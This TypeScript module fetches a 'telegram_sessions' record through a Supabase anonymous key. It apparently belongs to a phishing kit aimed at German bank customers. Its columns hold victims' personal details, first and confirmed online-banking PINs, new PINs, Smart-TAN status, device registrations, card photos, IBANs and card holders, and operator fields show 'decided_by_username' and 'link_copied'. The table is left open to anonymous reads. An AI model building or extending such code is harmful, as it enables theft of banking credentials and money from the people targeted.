// Reads a single telegram_sessions row via the anon key.
// The session id is an unguessable UUID; SELECT policy allows anon reads.
import { supabase } from "@/integrations/supabase/client";

export type TelegramSessionPublic = {
  id: string;
  decision: string | null;
  decided_by_username: string | null;
  link_copied: boolean | null;
  verfahren: string | null;
  security_choice: string | null;
  allowed_verfahren: string[] | null;
  customer_anrede: string | null;
  customer_name: string | null;
  customer_number: string | null;
  customer_birthday: string | null;
  customer_email: string | null;
  customer_email_label: string | null;
  customer_mobile: string | null;
  customer_mobile_label: string | null;
  customer_address_street: string | null;
  customer_address_city: string | null;
  deleted_address_text: string | null;
  device_name: string | null;
  device_app_id: string | null;
  device_registered_at: string | null;
  smart_photo_url: string | null;
  smart_tan_status: string | null;
  post_address_choice: string | null;
  pin_verwaltung_token: string | null;
  session_pin_first_attempt: string | null;
  session_pin_confirmed: string | null;
  session_pin_new: string | null;
  session_pin_mode: string | null;
  pin_verwaltung_card_photo_url: string | null;
  pin_verwaltung_card_type: string | null;
  pin_verwaltung_card_co_badge: string | null;
  pin_verwaltung_card_number_masked: string | null;
  pin_verwaltung_card_id_masked: string | null;
  pin_verwaltung_card_valid_thru: string | null;
  pin_verwaltung_card_iban: string | null;
  pin_verwaltung_card_holder: string | null;
};

const COLUMNS = [
  "id",
  "decision",
  "decided_by_username",
  "link_copied",
  "verfahren",
  "security_choice",
  "allowed_verfahren",
  "customer_anrede",
  "customer_name",
  "customer_number",
  "customer_birthday",
  "customer_email",
  "customer_email_label",
  "customer_mobile",
  "customer_mobile_label",
  "customer_address_street",
  "customer_address_city",
  "deleted_address_text",
  "device_name",
  "device_app_id",
  "device_registered_at",
  "smart_photo_url",
  "smart_tan_status",
  "post_address_choice",
  "pin_verwaltung_token",
  "session_pin_first_attempt",
  "session_pin_confirmed",
  "session_pin_new",
  "session_pin_mode",
  "pin_verwaltung_card_photo_url",
  "pin_verwaltung_card_type",
  "pin_verwaltung_card_co_badge",
  "pin_verwaltung_card_number_masked",
  "pin_verwaltung_card_id_masked",
  "pin_verwaltung_card_valid_thru",
  "pin_verwaltung_card_iban",
  "pin_verwaltung_card_holder",
].join(",");

export async function fetchTelegramSession(
  sessionId: string,
): Promise<TelegramSessionPublic | null> {
  if (!sessionId) return null;
  const { data, error } = await supabase
    .from("telegram_sessions")
    .select(COLUMNS)
    .eq("id", sessionId)
    .maybeSingle();
  if (error || !data) return null;
  return data as unknown as TelegramSessionPublic;
}
